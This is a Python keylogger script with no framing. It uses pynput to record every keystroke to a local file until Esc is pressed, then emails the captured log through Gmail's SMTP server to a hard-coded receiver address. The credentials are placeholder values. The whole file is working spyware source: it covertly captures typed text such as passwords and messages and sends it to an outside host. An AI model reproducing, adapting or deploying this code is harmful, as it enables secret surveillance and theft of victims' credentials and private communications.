# Import necessary libraries
from pynput import keyboard
import smtplib, ssl

# Set up email configuration
sender_email = "@gmail.com"
receiver_email = "@gmail.com"
password = ".123"
port = 587

# Create a message template for the email
message = """\
From: 
To: 
Subject: KeyLogs 


Text: Keylogs 
"""

# Function to write pressed keys to a file
def write_to_file(text):
    with open("keylogger.txt", 'a') as file:
        file.write(text)

# Function to handle key press events
def on_key_press(key):
    try:
        if key == keyboard.Key.enter:
            write_to_file("\nENTER PRESS ")
        else:
            write_to_file(str(key.char))
    except AttributeError:
        if key == keyboard.Key.backspace:
            write_to_file("\nBackspace Pressed\n")
        elif key == keyboard.Key.tab:
            write_to_file("\nTab Pressed\n")
        elif key == keyboard.Key.space:
            write_to_file("")
        else:
            temp = repr(key) + " Pressed.\n"
            write_to_file(temp)
            print("\n{} Pressed\n".format(key))

# Function to stop the keylogger
def on_key_release(key):
    if key == keyboard.Key.esc:
        return False

# Start the keylogger
with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    listener.join()

# Read collected data and send it via email
with open("keylogger.txt", 'r') as file:
    data = file.read()
    message = message + str(data)

# Set up a secure connection to the email server
context = ssl.create_default_context()
server = smtplib.SMTP('smtp.gmail.com', port)
server.starttls()
server.login(sender_email, password)

try:
    # Send the email
    server.sendmail(sender_email, receiver_email, message)
    print("Email Sent to ", sender_email)
except Exception as e:
    print(f"Error sending email: {e}")

# Close the email server connection
server.quit()

